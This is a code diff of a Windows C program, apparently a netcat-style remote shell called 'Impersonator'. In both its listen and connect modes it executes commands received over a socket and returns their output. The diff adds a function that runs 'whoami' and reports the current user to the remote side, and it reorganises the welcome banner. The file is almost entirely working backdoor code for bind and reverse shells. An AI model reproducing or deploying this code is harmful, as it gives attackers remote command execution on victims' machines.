@@ -2,10 +2,23 @@
 #include <Windows.h>
 #include <stdio.h>
 #include "doexec.h"
+#include <Lmcons.h>
 
 /*
 * String IO Functions
 */
+void Help(char *name)
+{
+    printf("Usage:\n");
+    printf("\t-u - use udp instead of tcp\n");
+    printf("\t-l - server mode, ADDRESS can be blank, default ip will be used\n");
+    printf("\t-4 - force ip4\n");
+    printf("\t-6 - force ip6\n\n");
+    printf("\t%s [-u -4 -6] ADDRESS PORT\n", name);
+    printf("\t%s -l [-u -4 -6] [ADDRESS] PORT\n", name);
+    exit(0);
+}
+
 int header(int sockfd){
 
     /*print Impersonator*/
@@ -28,34 +41,24 @@ int command_prompt(int sockfd){
     return 0;
 }
 
-void Help(char *name)
-{
-    printf("Usage:\n");
-    printf("\t-u - use udp instead of tcp\n");
-    printf("\t-l - server mode, ADDRESS can be blank, default ip will be used\n");
-    printf("\t-4 - force ip4\n");
-    printf("\t-6 - force ip6\n\n");
-    printf("\t%s [-u -4 -6] ADDRESS PORT\n", name);
-    printf("\t%s -l [-u -4 -6] [ADDRESS] PORT\n", name);
-    exit(0);
+int username(int sockfd){
+
+    /*print Impersonator*/
+    char *print_this = "\r\n\r\n[+] The Current User Is: ";
+    send(sockfd, print_this, sizeof(char) * strlen(print_this), 0);
+    
+    char *whoami = "whoami\r\n";
+    char *name = norm_exec(whoami);
+    send(sockfd, name, sizeof(char) * strlen(name), 0);
+    free(name);
+    return 0;
 }
 
-/*
-* Priv Esc Functionality
-*/
-
-void get_username(int sockfd){
-    char *username = doexec(whoami);
-    char greeting = "[+] Current user is: ";
-    strcat(greeting, username);
-    strcat(greeting, "\r\n");
-    send(sockfd, greeting, sizeof(char) * strlen(greeting), 0);
-
+int welcomeMessage(int sockfd){
+    header(sockfd);
+    username(sockfd);
+    command_prompt(sockfd);
 }
-
-/*
-* Socket Functions
-*/
 
 int server(int port){
     WSADATA WSAData;
@@ -74,12 +77,10 @@ int server(int port){
     char buffer[1024];
     int clientAddrSize = sizeof(clientAddr);
     client = accept(server, (SOCKADDR *)&clientAddr, &clientAddrSize);
-    header(client);
-    get_username(client);
-    command_prompt(client);
+    welcomeMessage(client);
     while (recv(client, buffer, sizeof(buffer), 0) > 0) {
         char *ans = doexec(buffer);
-        send(client, ans, strlen(ans) * sizeof(char),0);
+        send(client, ans, strlen(ans) * sizeof(char) + 1,0);
         command_prompt(client);
         memset(buffer, '\0', sizeof(buffer));
     }
@@ -100,9 +101,7 @@ int client(char *rhost, int port){
     server.sin_port = htons(port);
 
     client = connect(s, (struct sockaddr *)&server , sizeof(server));
-    header(s);
-    get_username(s);
-    command_prompt(s);
+    welcomeMessage(s);
     char buffer[1024];
     while (recv(s, buffer, sizeof(buffer), 0) > 0) {
         char *ans = doexec(buffer);
